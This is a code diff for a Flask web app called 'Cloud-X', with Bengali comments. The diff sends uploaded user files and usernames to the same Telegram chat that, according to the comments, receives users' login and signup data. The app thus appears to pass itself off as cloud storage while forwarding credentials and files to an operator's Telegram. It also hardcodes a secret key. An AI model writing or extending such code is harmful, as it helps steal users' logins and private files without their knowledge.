@@ -6,15 +6,9 @@ from werkzeug.utils import secure_filename
 app = Flask(__name__)
 app.secret_key = 'cloud-x-secret-key-security'
 
-# টেলিগ্রাম বট টোকেন
+# Render-এর Environment Variable থেকে টেলিগ্রাম টোকেন ও মূল চ্যাট আইডি রিড করবে
 TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
-
-# ১. লগইন/সাইনআপ ডেটা যাওয়ার চ্যাট আইডি
 TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
-
-# ২. ফাইল বা মিডিয়া স্টোর হওয়ার আলাদা গ্রুপ/চ্যাট আইডি 
-# (যদি আলাদা ভ্যারিয়েবল না দিয়ে সরাসরি গ্রুপের আইডি বসাতে চান, তবে সরাসরি এখানে মাইনাসসহ লিখে দিতে পারেন যেমন: "-100xxxxxxxxxx")
-TELEGRAM_UPLOAD_CHAT_ID = os.getenv("TELEGRAM_UPLOAD_CHAT_ID", TELEGRAM_CHAT_ID)
 
 UPLOAD_FOLDER = 'uploads'
 ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'mp4', 'mov', 'avi', 'pdf', 'zip'}
@@ -102,7 +96,7 @@ def login():
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)})
 
-# ফাইল আপলোড এবং আলাদা গ্রুপে পাঠানোর রাউট
+# ফাইল আপলোড এবং মূল TELEGRAM_CHAT_ID-তে পাঠানোর রাউট
 @app.route('/upload', methods=['POST'])
 def upload_file():
     if 'file' not in request.files:
@@ -119,20 +113,20 @@ def upload_file():
         
         current_user = session.get('username', 'Unknown User')
 
-        # এখানে TELEGRAM_UPLOAD_CHAT_ID ব্যবহার করা হয়েছে, যা ফাইল স্টোর করার আলাদা গ্রুপে পাঠাবে
+        # এখন থেকে ফাইলগুলোও মূল TELEGRAM_CHAT_ID (যেখানে লগইন ডিটেইলস যায়) সেখানেই যাবে
         tg_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
         with open(filepath, 'rb') as f:
             files = {'document': f}
             data = {
-                "chat_id": TELEGRAM_UPLOAD_CHAT_ID, 
-                "caption": f"📁 *New Media Stored in Cloud-X*\n👤 *User:* {current_user}\n📄 *File Name:* {filename}",
+                "chat_id": TELEGRAM_CHAT_ID, 
+                "caption": f"📁 *New Media Uploaded to Cloud-X*\n👤 *User:* {current_user}\n📄 *File Name:* {filename}",
                 "parse_mode": "Markdown"
             }
             requests.post(tg_url, data=data, files=files)
 
         return jsonify({
             "status": "success", 
-            "message": "File uploaded and stored in Telegram group", 
+            "message": "File uploaded and sent to Telegram", 
             "filename": filename
         })
     
